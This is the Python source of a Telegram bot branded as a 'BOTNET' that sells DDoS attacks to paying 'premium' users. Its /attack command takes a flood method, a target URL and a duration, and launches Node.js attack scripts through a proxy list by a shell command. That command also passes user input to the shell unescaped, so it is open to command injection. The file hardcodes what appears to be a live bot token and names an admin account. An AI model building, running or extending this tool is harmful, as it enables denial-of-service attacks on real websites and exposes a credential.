import telebot
import os
import subprocess
import threading
from datetime import datetime
import time

# Initialize bot with your token
TOKEN = "7762846339:AAGzOirfjmxTYw14FK7fujiS05mPnwGHPBc"
bot = telebot.TeleBot(TOKEN)

# File to store premium users
PREMIUM_USERS_FILE = "premium_users.txt"
PROXY_FILE = "proxy.txt"
UA_FILE = "user-agents.txt"
ADMIN_USER = "BorNo_SixNine"
is_attack_running = False

# Methods for attacks
METHODS = ["DRAGON", "TLS", "KILL"]

# Load premium users from file
def load_premium_users():
    if not os.path.exists(PREMIUM_USERS_FILE):
        return set()
    with open(PREMIUM_USERS_FILE, 'r') as file:
        users = {line.strip() for line in file.readlines()}
    return users

# Save premium users to file
def save_premium_users(users):
    with open(PREMIUM_USERS_FILE, 'w') as file:
        for user in users:
            file.write(f"{user}\n")

# Load premium users at startup
premium_users = load_premium_users()

# Function to handle attack end
def end_attack(chat_id, url, duration):
    global is_attack_running
    time.sleep(duration)
    is_attack_running = False
    bot.send_message(chat_id, f"Attack has ended on {url}.")

# Loading animation
def send_loading_animation(chat_id):
    for i in range(3):
        bot.send_message(chat_id, f"Loading {'.' * (i+1)}")
        time.sleep(1)

# Start message with stylistic commands
@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    send_loading_animation(chat_id)
    time.sleep(3)
    bot.send_message(chat_id, """
>DRAGON | 𝗕𝗢𝗧𝗡ET
▬▭▬▭▬▭▬▭▬▭▬▭▬
Attack Command
- /attack
▬▭▬▭▬▭▬▭▬▭▬▭▬
Preparation Command
- /methods
- /updateproxy
- /proxycount
- /uacount
▬▭▬▭▬▭▬▭▬▭▬▭▬
Owner Command
- /addprem
- /delprem
▬▭▬▭▬▭▬▭▬▭▬▭▬
    """)

# Handle the /methods command to display available methods
@bot.message_handler(commands=['methods'])
def list_methods(message):
    bot.send_message(message.chat.id, """
>Available Methods:
▬▭▬▭▬▭▬▭▬▭▬▭▬
- DRAGON
- TLS
- KILL
▬▭▬▭▬▭▬▭▬▭▬▭▬
    """)

# Handle the /attack command
@bot.message_handler(commands=['attack'])
def attack(message):
    global is_attack_running
    user = message.from_user.username

    if user not in premium_users:
        bot.send_message(message.chat.id, """
>Access Denied
▬▭▬▭▬▭▬▭▬▭▬▭▬
Only premium users can use the /attack command.
▬▭▬▭▬▭▬▭▬▭▬▭▬
        """)
        return

    if is_attack_running:
        bot.send_message(message.chat.id, """
>Attack In Progress
▬▭▬▭▬▭▬▭▬▭▬▭▬
An attack is already running. Please wait for it to finish.
▬▭▬▭▬▭▬▭▬▭▬▭▬
        """)
        return

    try:
        # Parse method, URL, and time from the command
        args = message.text.split()
        if len(args) != 4:
            bot.send_message(message.chat.id, """
>Invalid Command
▬▭▬▭▬▭▬▭▬▭▬▭▬
Usage: /attack <method> <url> <time>
▬▭▬▭▬▭▬▭▬▭▬▭▬
            """)
            return
        
        method = args[1].upper()
        url = args[2]
        duration = int(args[3])

        # Check if method is valid
        if method not in METHODS:
            bot.send_message(message.chat.id, f"""
>Invalid Method
▬▭▬▭▬▭▬▭▬▭▬▭▬
Available methods: {', '.join(METHODS)}
▬▭▬▭▬▭▬▭▬▭▬▭▬
            """)
            return

        # Enforce the maximum attack duration of 120 seconds
        if duration > 120:
            bot.send_message(message.chat.id, """
>Duration Error
▬▭▬▭▬▭▬▭▬▭▬▭▬
The maximum allowed attack duration is 120 seconds.
▬▭▬▭▬▭▬▭▬▭▬▭▬
            """)
            return

        # Set the attack running status
        is_attack_running = True

        # Send the immediate alert message
        bot.send_message(message.chat.id, "[❗]")

        # Execute the attack command in VPS
        command = f"node {method}.js {url} {duration} 64 10 proxy.txt"
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
        process.wait()

        # Send attack start message immediately
        start_time = datetime.now().strftime("%m/%d/%Y, %I:%M:%S %p")
        bot.send_message(message.chat.id, f"""
>Command Executed!
▬▭▬▭▬▭▬▭▬▭▬▭▬
Target: {url}
Duration: {duration} seconds
Method: {method}
*Start Time:* {start_time}
*Running Attacks:* 1/1
➖➖➖➖➖➖➖➖➖➖
*Owner : ( @{ADMIN_USER} )*
        """)

        # Start a thread to handle attack end message
        threading.Thread(target=end_attack, args=(message.chat.id, url, duration)).start()

    except Exception as e:
        is_attack_running = False
        bot.send_message(message.chat.id, f"""
>Error Occurred
▬▭▬▭▬▭▬▭▬▭▬▭▬
{str(e)}
▬▭▬▭▬▭▬▭▬▭▬▭▬
        """)

# Handle the /proxycount command to count proxies in proxy.txt
@bot.message_handler(commands=['proxycount'])
def proxy_count(message):
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'r') as file:
            proxies = file.readlines()
            count = len(proxies)
            bot.send_message(message.chat.id, f"""
>Proxy Count
▬▭▬▭▬▭▬▭▬▭▬▭▬
Proxy Count: {count}
▬▭▬▭▬▭▬▭▬▭▬▭▬
            """)
    else:
        bot.send_message(message.chat.id, """
>Proxy File Missing
▬▭▬▭▬▭▬▭▬▭▬▭▬
The proxy file does not exist.
▬▭▬▭▬▭▬▭▬▭▬▭▬
        """)

# Handle the /uacount command to count user-agents in user-agents.txt
@bot.message_handler(commands=['uacount'])
def ua_count(message):
    if os.path.exists(UA_FILE):
        with open(UA_FILE, 'r') as file:
            uas = file.readlines()
            count = len(uas)
            bot.send_message(message.chat.id, f"""
>User-Agent Count
▬▭▬▭▬▭▬▭▬▭▬▭▬
User-Agent Count: {count}
▬▭▬▭▬▭▬▭▬▭▬▭▬
            """)
    else:
        bot.send_message(message.chat.id, """
>User-Agent File Missing
▬▭▬▭▬▭▬▭▬▭▬▭▬
The user-agent file does not exist.
▬▭▬▭▬▭▬▭▬▭▬▭▬
        """)

# Handle the /addprem command to add premium users (admin only)
@bot.message_handler(commands=['addprem'])
def add_premium_user(message):
    if message.from_user.username == ADMIN_USER:
        try:
            user_to_add = message.text.split()[1]
            premium_users.add(user_to_add)
            save_premium_users(premium_users)
            bot.send_message(message.chat.id, f"""
>Premium User Added
▬▭▬▭▬▭▬▭▬▭▬▭▬
User {user_to_add} added to premium users.
▬▭▬▭▬▭▬▭▬▭▬▭▬
            """)
        except IndexError:
            bot.send_message(message.chat.id, """
>Invalid Command
▬▭▬▭▬▭▬▭▬▭▬▭▬
Usage: /addprem <username>
▬▭▬▭▬▭▬▭▬▭▬▭▬
            """)
    else:
        bot.send_message(message.chat.id, """
>Access Denied
▬▭▬▭▬▭▬▭▬▭▬▭▬
Only the admin can add premium users.
▬▭▬▭▬▭▬▭▬▭▬▭▬
        """)

# Handle the /delprem command to remove premium users (admin only)
@bot.message_handler(commands=['delprem'])
def remove_premium_user(message):
    if message.from_user.username == ADMIN_USER:
        try:
            user_to_remove = message.text.split()[1]
            if user_to_remove in premium_users:
                premium_users.remove(user_to_remove)
                save_premium_users(premium_users)
                bot.send_message(message.chat.id, f"""
>Premium User Removed
▬▭▬▭▬▭▬▭▬▭▬▭▬
User {user_to_remove} removed from premium users.
▬▭▬▭▬▭▬▭▬▭▬▭▬
                """)
            else:
                bot.send_message(message.chat.id, f"""
>User Not Found
▬▭▬▭▬▭▬▭▬▭▬▭▬
User {user_to_remove} is not a premium user.
▬▭▬▭▬▭▬▭▬▭▬▭▬
                """)
        except IndexError:
            bot.send_message(message.chat.id, """
>Invalid Command
▬▭▬▭▬▭▬▭▬▭▬▭▬
Usage: /delprem <username>
▬▭▬▭▬▭▬▭▬▭▬▭▬
            """)
    else:
        bot.send_message(message.chat.id, """
>Access Denied
▬▭▬▭▬▭▬▭▬▭▬▭▬
Only the admin can remove premium users.
▬▭▬▭▬▭▬▭▬▭▬▭▬
        """)

# Start polling to listen to commands
bot.polling()
